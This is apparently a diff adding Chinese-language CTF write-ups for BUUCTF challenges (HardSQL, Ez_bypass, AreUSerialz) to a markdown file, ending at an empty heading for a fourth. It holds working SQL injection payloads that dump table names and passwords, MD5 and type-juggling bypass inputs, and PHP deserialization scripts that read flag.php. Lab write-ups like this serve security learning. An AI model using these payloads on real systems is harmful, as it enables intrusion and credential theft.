@@ -2700,6 +2700,286 @@ var_dump(base64_encode($str));
 /?text=php://input&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
 ```
 
+### 27. [极客大挑战 2019]HardSQL
+
+报错注入，利用函数**extractvalue()**；
+
+extractvalue() ：对XML文档进行查询的函数，语法：`extractvalue(目标xml文档，xml路径)`
+
+- 第一个参数 :  传入目标xml文档
+- 第二个参数： xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容；
+- tip: 能够查询的字符串长度最大是32个字符，如果超过32位，我们就需要用函数来查询，比如right(),left()，substr()来截取字符串；
+- 用’^'来连接函数，形成异或
+
+爆库：
+
+```
+?username=admin&password=admin'^extractvalue(1,concat(0x5c,(select(database()))))%23
+```
+
+爆表（等于号过滤了使用like）：
+
+```
+?username=admin&password=admin'^extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))
+```
+
+爆列：
+
+```
+?username=admin&password=admin'^extractvalue(1,concat(0x5c,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))%23
+```
+
+爆数据：
+
+```
+?username=admin&password=admin'^extractvalue(1,concat(0x5c,(select(password)from(H4rDsq1))))%23
+```
+
+由于extractvalue()函数一次只能显示32个字符，我们需要用right函数拼接出另外一半：
+
+![image-20240104093001087](buu_wp.assets/image-20240104093001087.png)
+
+right：
+
+```
+?username=admin&password=admin'^extractvalue(1,concat(0x5c,(select(right(password,16))from(H4rDsq1))))%23
+```
+
+拼接得到flag
+
+![image-20240104093327604](buu_wp.assets/image-20240104093327604.png)
+
+### 28. [MRCTF2020]Ez_bypass
+
+代码审计：
+
+```php
+I put something in F12 for you
+include 'flag.php';
+$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
+if(isset($_GET['gg'])&&isset($_GET['id'])) {
+    $id=$_GET['id'];
+    $gg=$_GET['gg'];
+    if (md5($id) === md5($gg) && $id !== $gg) {
+        echo 'You got the first step';
+        if(isset($_POST['passwd'])) {
+            $passwd=$_POST['passwd'];
+            if (!is_numeric($passwd))
+            {
+                 if($passwd==1234567)
+                 {
+                     echo 'Good Job!';
+                     highlight_file('flag.php');
+                     die('By Retr_0');
+                 }
+                 else
+                 {
+                     echo "can you think twice??";
+                 }
+            }
+            else{
+                echo 'You can not get it !';
+            }
+
+        }
+        else{
+            die('only one way to get the flag');
+        }
+}
+    else {
+        echo "You are not a real hacker!";
+    }
+}
+else{
+    die('Please input first');
+}
+}Please input first
+```
+
+- ` if (md5($id) === md5($gg) && $id !== $gg)`：md5弱相等绕过，使用数组；
+- ` if (!is_numeric($passwd))`、`if($passwd==1234567)`：字符若相等
+
+最终payload：
+
+```
+?id[]=111&gg[]=222
+
+passwd=1234567x
+```
+
+得到flag：
+
+![image-20240104093907287](buu_wp.assets/image-20240104093907287.png)
+
+### 29. [网鼎杯 2020 青龙组]AreUSerialz
+
+代码审计：
+
+```php
+<?php
+
+include("flag.php");
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = "1";
+        $filename = "/tmp/tmpfile";
+        $content = "Hello World!";
+        $this->process();
+    }
+
+    public function process() {
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
+        }
+    }
+
+    private function write() {
+        if(isset($this->filename) && isset($this->content)) {
+            if(strlen((string)$this->content) > 100) {
+                $this->output("Too long!");
+                die();
+            }
+            $res = file_put_contents($this->filename, $this->content);
+            if($res) $this->output("Successful!");
+            else $this->output("Failed!");
+        } else {
+            $this->output("Failed!");
+        }
+    }
+
+    private function read() {
+        $res = "";
+        if(isset($this->filename)) {
+            $res = file_get_contents($this->filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo "[Result]: <br>";
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this->op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+```
+
+序列化，去调用read函数读取flag，需要满足：
+
+- op=2
+- content<100
+- 传入的payload通过is_valid检测
+  - `is_valid()`函数对传入的字符串进行判断，确保每一个字符ASCII码值都在32-125，即该函数的作用是确保参数字符串的每一个字符都是可打印的，才返回true。
+
+
+
+![img](buu_wp.assets/20200923094018303.png)
+
+
+
+**方法一：突破ord函数限制**
+
+序列化脚本：
+
+```php
+<?php
+  class FileHandler {
+  protected $op = 2;
+  protected $filename ='flag.php';         
+ //题目中包含flag的文件
+protected $content;
+
+}
+$bai = urlencode(serialize(new FileHandler)); 
+//URL编码实例化后的类FileHandler序列化结果
+$mao =str_replace('%00',"\\00",$bai);    
+//str_replace函数查找变量bai里面的数值%00并将其替换为\\00
+$mao =str_replace('s','S',$mao);         
+//str_replace函数查找变量mao里面的数值s并将其替换为S
+echo $mao                                               
+//打印结果
+?>
+
+```
+
+
+
+**方法二：突破protected访问修饰符限制**
+
+序列化脚本：
+
+```php
+<?php
+  class FileHandler {
+  protected $op = 2;
+  protected $filename ='php://filter/read=convert.base64-encode/resource=flag.php';             
+//php://filter伪协议
+protected $content;
+
+}
+$baimao=serialize(new FileHandler());
+//实例化并序列化类FileHandler
+echo $baimao;
+//打印结果
+?>
+
+```
+
+序列化结果
+
+```
+O:11:"FileHandler":3:{s:5:" * op";i:2;s:11:" * filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:10:" * content";N;}
+```
+
+删除乱码并减去相应长度
+
+```
+O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}
+```
+
+构造payload
+
+```
+?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}
+```
+
+### 30. [SUCTF 2019]CheckIn
+
 
 
 ### [网鼎杯 2020 青龙组]filejava
